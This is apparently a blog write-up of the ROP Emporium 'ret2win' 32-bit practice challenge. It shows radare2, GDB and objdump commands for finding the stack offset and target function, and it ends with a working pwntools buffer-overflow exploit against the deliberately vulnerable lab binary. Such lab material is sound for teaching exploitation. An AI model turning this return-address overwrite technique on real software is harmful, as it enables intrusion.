---
layout: post
title: ROP Emporium Challenge 0: ret2win (32 bits)
excerpt_separator: <!--more-->
---

Description: *Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.*
<!--more-->

# ret2win32

Link: https://ropemporium.com/challenge/ret2win.html


--------------------------


## 1. Studying the binary

List functions with:

```
nm ret2win32 | grep 't'
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_1.jpg)

Or with radare:

```
r2 ret2win32
aaaa
afl
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_2.jpg)

Then we can disassembly this function using again radare:

```
r2 ret2win32
aaaa
s sym.ret2win
pdf
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_3.jpg)

We can disassembly the main function too:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_4.jpg)


## 2. Calculating EIP overwrite offset

I will open GDB with GEF script:

```
gdb -q ./ret2win32
```

Using Python we create characters to test when it crashes:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_5.jpg)


With 45 we overwrite only 1 byte, so the offset is 44:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_6.jpg)

Note: It will be the same offset for all the 32 bits binaries of Rop Emporium.


## 3. Calling ret2win

We can find the function address with:

```
objdump -D ret2win32 | grep ret2win
```

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_7.jpg)

This address can be found also using gdb (*info functions*).

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_8.jpg)



## 4. Final exploit

The exploit code is then:

```
from pwn import *

context(arch='i386', os='linux')
p = process('./ret2win32')

junk =    "A"*44
ret2win = 0x08048659
rop = junk + p32(ret2win)
p.recvuntil("> ")
p.send(rop)
p.interactive()
```

The result:

![a](https://raw.githubusercontent.com/ricardojoserf/rop-emporium-exploits/master/0_ret2win32/images/Screenshot_9.jpg)
